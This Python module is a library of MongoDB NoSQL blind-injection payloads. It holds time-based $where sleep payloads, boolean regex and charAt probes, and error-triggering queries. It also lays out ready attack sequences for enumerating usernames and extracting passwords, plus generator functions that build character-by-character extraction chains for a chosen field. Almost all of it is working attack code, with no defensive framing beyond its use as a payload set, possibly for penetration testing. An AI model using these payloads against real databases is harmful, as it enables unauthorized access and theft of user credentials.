"""
MongoDB盲注攻击载荷
包含时间盲注、布尔盲注和错误盲注技术
"""

import random

# 时间盲注载荷 - 通过延时来判断条件是否为真
TIME_BASED_PAYLOADS = [
    # 基本时间盲注
    {"$where": "function(){sleep(3000)}"},
    {"$where": "function(){sleep(3000); return true;}"},
    
    # 条件时间盲注
    {"$where": "function(){if(this.username=='admin'){sleep(3000)}; return true;}"},
    {"$where": "function(){if(this.password.length>5){sleep(3000)}; return true;}"},
    {"$where": "function(){if(this.password.substr(0,1)=='a'){sleep(3000)}; return true;}"},
    
    # 手动延时
    {"$where": "function(){var d=new Date(); while(new Date()-d<3000){}}; return true;"},
    {"$where": "function(){var i=0; while(i<1000000){i++;}; return true;}"},
    
    # 递归延时
    {"$function": {"body": "function(){let i=0; while(i<1000000){i++;}; return true;}"}},
    {"$function": {"body": "function f(x){if(x>0)f(x-1);else{sleep(3000);}} f(5); return true;"}},
]

# 布尔盲注载荷 - 通过真/假条件判断数据内容
BOOLEAN_BASED_PAYLOADS = [
    # 用户名检测
    {"username": {"$regex": "^a"}},
    {"username": {"$regex": "^admin"}},
    {"username": {"$in": ["admin", "root", "administrator"]}},
    
    # 密码信息提取
    {"$where": "this.password.length > 5"},
    {"$where": "this.password.length < 10"},
    {"$where": "this.password.charAt(0) == 'a'"},
    {"$where": "this.password.charCodeAt(0) > 97"},
    
    # 数据类型检测
    {"username": {"$type": 2}},  # 检测是否为字符串类型
    {"password": {"$exists": True}},  # 检测密码字段是否存在
    
    # 条件组合
    {"$or": [{"username": {"$regex": "^a"}}, {"email": {"$regex": "gmail"}}]},
    {"$and": [{"username": {"$regex": "^a"}}, {"password": {"$regex": "^p"}}]},
]

# 错误盲注载荷 - 通过错误信息判断条件
ERROR_BASED_PAYLOADS = [
    # 类型错误
    {"username": {"$concat": ["admin", 5]}},  # 字符串和数字连接会导致错误
    {"username": {"$add": ["admin", "password"]}},  # 尝试对字符串执行数学运算
    
    # 除零错误
    {"$where": "this.value/0 == 0"},
    {"$expr": {"$divide": ["$value", 0]}},
    
    # 函数参数错误
    {"username": {"$substr": ["admin", -1, 5]}},  # 负数索引会导致错误
    {"username": {"$substrBytes": ["admin", 10, 5]}},  # 超出范围的索引
    
    # 正则表达式错误
    {"username": {"$regex": "["}},  # 无效的正则表达式
    {"username": {"$regex": "(?=.*"}},  # 无效的前瞻断言
]

# 盲注数据提取载荷模板
DATA_EXTRACTION_TEMPLATES = [
    # 提取用户名第N个字符
    {"template": "this.username.charAt({pos}) == '{char}'", "description": "检测用户名指定位置的字符"},
    {"template": "this.username.substr({pos}, 1) == '{char}'", "description": "提取用户名子字符串"},
    
    # 提取密码信息
    {"template": "this.password.length == {length}", "description": "检测密码长度"},
    {"template": "this.password.charAt({pos}) == '{char}'", "description": "检测密码指定位置的字符"},
    {"template": "this.password.charCodeAt({pos}) == {code}", "description": "检测密码字符的ASCII码"},
    {"template": "this.password.charCodeAt({pos}) > {code}", "description": "比较密码字符的ASCII码范围"},
    
    # 提取其他字段
    {"template": "this.{field} !== undefined", "description": "检测字段是否存在"},
    {"template": "this.{field}.indexOf('{substring}') != -1", "description": "检测字段是否包含特定子字符串"},
    {"template": "Array.isArray(this.{field})", "description": "检测字段是否为数组类型"},
]

# 完整盲注攻击链
BLIND_ATTACK_SEQUENCES = [
    {
        "name": "用户名枚举",
        "type": "boolean",
        "steps": [
            {"payload": {"username": {"$regex": "^a"}}, "description": "检测以'a'开头的用户名"},
            {"payload": {"username": {"$regex": "^ad"}}, "description": "检测以'ad'开头的用户名"},
            {"payload": {"username": {"$regex": "^adm"}}, "description": "检测以'adm'开头的用户名"},
            {"payload": {"username": {"$regex": "^admi"}}, "description": "检测以'admi'开头的用户名"},
            {"payload": {"username": {"$regex": "^admin"}}, "description": "检测以'admin'开头的用户名"}
        ]
    },
    {
        "name": "密码长度检测",
        "type": "time",
        "steps": [
            {"payload": {"$where": "function(){if(this.password.length>0){sleep(1000)}; return true;}"}, "description": "密码长度 > 0"},
            {"payload": {"$where": "function(){if(this.password.length>5){sleep(1000)}; return true;}"}, "description": "密码长度 > 5"},
            {"payload": {"$where": "function(){if(this.password.length>8){sleep(1000)}; return true;}"}, "description": "密码长度 > 8"},
            {"payload": {"$where": "function(){if(this.password.length>10){sleep(1000)}; return true;}"}, "description": "密码长度 > 10"}
        ]
    },
    {
        "name": "密码内容提取",
        "type": "boolean",
        "steps": [
            {"payload": {"$where": "this.password.charAt(0) == 'p'"}, "description": "检测密码首字符是否为'p'"},
            {"payload": {"$where": "this.password.charAt(1) == 'a'"}, "description": "检测密码第二个字符是否为'a'"},
            {"payload": {"$where": "this.password.charAt(2) == 's'"}, "description": "检测密码第三个字符是否为's'"},
            {"payload": {"$where": "this.password.charAt(3) == 's'"}, "description": "检测密码第四个字符是否为's'"}
        ]
    }
]

# 自定義時間盲注生成
def generate_time_payload(delay_ms=2000, condition=None):
    """
    生成自定義的時間盲注載荷
    
    Args:
        delay_ms (int): 延遲毫秒數
        condition (str): 條件表達式，如 "this.username=='admin'"
    
    Returns:
        dict: 時間盲注載荷
    """
    if condition:
        return {"$where": f"if({condition}){{sleep({delay_ms})}}; return true"}
    else:
        return {"$where": f"sleep({delay_ms}) || true"}

# 自定義布爾盲注生成
def generate_boolean_payload(field, position, character=None, operation=None):
    """
    生成自定義的布爾盲注載荷用於數據提取
    
    Args:
        field (str): 要提取的字段名
        position (int): 字符位置
        character (str, optional): 要比較的字符
        operation (str, optional): 比較操作符，如'==', '>', '<'
    
    Returns:
        dict: 布爾盲注載荷
    """
    if character and operation:
        return {"$where": f"this.{field}.charAt({position}) {operation} '{character}'"}
    elif operation:
        return {"$where": f"this.{field}.charCodeAt({position}) {operation} 0"}
    else:
        return {"$where": f"this.{field}.length > {position}"}

# 完整的數據提取盲注套件
def get_data_extraction_payloads(target_field="password"):
    """
    獲取用於數據提取的完整盲注套件
    
    Args:
        target_field (str): 目標字段，如'password'或'email'
    
    Returns:
        dict: 數據提取payload集合
    """
    extraction_payloads = {
        "length_check": [
            {"$where": f"this.{target_field}.length > {i}"} for i in range(5, 20)
        ],
        "character_checks": [
            {
                "position": i,
                "values": [
                    {"$where": f"this.{target_field}.charAt({i}) == '{c}'"} 
                    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                ]
            } for i in range(10)  # 檢查前10個字符位置
        ],
        "time_based": [
            {"$where": f"if(this.{target_field}.charAt({i})=='a'){{sleep(2000)}}; return true"} 
            for i in range(10)  # 檢查前10個字符位置
        ]
    }
    return extraction_payloads

# 經典的字段提取盲注鏈（返回一個數組，可依次執行）
def get_blind_extraction_chain(field_name="password", known_prefix=""):
    """
    獲取經典的字段提取盲注鏈
    
    Args:
        field_name (str): 要提取的字段名
        known_prefix (str): 已知的字段值前綴
    
    Returns:
        list: 盲注鏈，可依次執行
    """
    position = len(known_prefix)
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    return [
        {
            "type": "length",
            "payload": {"$where": f"this.{field_name}.length > {position}"},
            "description": f"檢查{field_name}長度是否大於{position}"
        }
    ] + [
        {
            "type": "character",
            "position": position,
            "char": c,
            "payload": {"$where": f"this.{field_name}.charAt({position}) == '{c}'"},
            "description": f"檢查{field_name}在位置{position}的字符是否為'{c}'"
        } for c in charset
    ] 